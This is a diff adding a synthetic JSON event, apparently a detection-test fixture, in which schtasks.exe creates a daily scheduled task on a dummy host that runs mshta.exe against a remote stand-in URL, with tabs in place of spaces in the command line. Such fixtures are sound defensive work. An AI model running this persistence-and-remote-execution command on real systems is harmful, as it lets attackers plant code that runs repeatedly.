@@ -1,0 +1,8 @@
+{
+  "schema_version": 1,
+  "synthetic": true,
+  "event": {
+    "FileName": "schtasks.exe",
+    "ProcessCommandLine": "schtasks.exe /create\t/s\tsynthetic-host /tn Synthetic /tr \"mshta.exe https://example.invalid/a\" /sc daily"
+  }
+}
